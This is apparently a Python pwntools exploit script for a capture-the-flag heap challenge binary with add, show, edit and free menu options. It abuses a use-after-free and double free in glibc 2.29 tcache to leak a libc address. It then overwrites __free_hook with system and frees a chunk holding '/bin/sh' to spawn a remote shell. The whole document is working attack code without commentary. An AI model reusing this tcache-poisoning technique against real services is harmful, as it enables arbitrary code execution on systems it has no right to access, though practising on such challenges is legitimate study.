#-*- coding:utf-8 -*-
from PwnContext import *
context.terminal = ['tmux','splitw','-h']
s       = lambda data               :ctx.send(str(data))
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))

debugg = 0
logg = 0
ctx.binary = './pwn'
#ctx.breakpoints=[0xC88,0xBCF]#,,puts
#ctx.symbols={'lst':0x202060}
#ctx.custom_lib_dir = '/home/leo/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/'#remote libc
#ctx.remote_libc = '/home/leo/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'
#ctx.debug_remote_libc = True

libc = ELF('/home/leo/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so',checksec=False)
if debugg:
    rs()
else:
    ctx.remote = ('0.0.0.0', 8888)
    rs('remote')
#ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")
if logg:
    context.log_level='debug'
def add(name,c):
    sla('Give me your choice : ',1)
    sa('input name',name)
    sa('input sex','M')#0x10
    sa('input information',c)

def free(idx):
    sla('Give me your choice : ',4)
    sla('Give me your index : ',idx)
    
def show(idx):
    sla('Give me your choice : ',2)
    sla('Give me your index : ',idx)

def edit(idx,c):
    sla('Give me your choice : ',3)
    sla('Give me your index : ',idx)
    sa('Are you sure change sex?','Y\0')
    sa('Now change information',c)

add('a'*8,'a'*0x70)
add('a'*8,'b'*0x70)
add('a'*8,'c'*0x70)
add('a'*8,'d'*0x70)

free(3)
edit(3,'1'*0x70)
free(3)

free(2)
edit(2,'1'*0x70)
free(2)

free(1)
edit(1,'1'*0x70)

free(0)
edit(0,'1'*0x70)
free(0)

free(1)

show(1)
lb = uu64(ru('\x7f',drop = False)[-6:])-0x1e4ca0
success(hex(lb))
sys = lb + libc.sym['system']
fh = lb + libc.sym['__free_hook']

add(p64(fh),p64(fh)*14)
add('/bin/sh\x00','/bin/sh\x00'*14)
add(p64(sys),p64(sys)*14)
free(5)

irt()

